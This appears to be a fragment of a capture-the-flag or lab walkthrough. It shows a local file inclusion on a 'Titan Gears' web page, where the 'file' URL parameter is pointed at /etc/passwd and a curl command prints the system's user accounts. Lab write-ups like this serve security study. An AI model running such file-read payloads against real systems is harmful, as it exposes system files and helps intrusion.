The IP redirects to a webpage for Titan Gears
http://10.129.69.47/?file=home.php

Changing the ed of the url shows the contents of /etc/passwd
http://10.129.69.47/?file=/etc/passwd
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.69.47/?file=/etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
lxd:x:105:65534::/var/lib/lxd/:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash

```
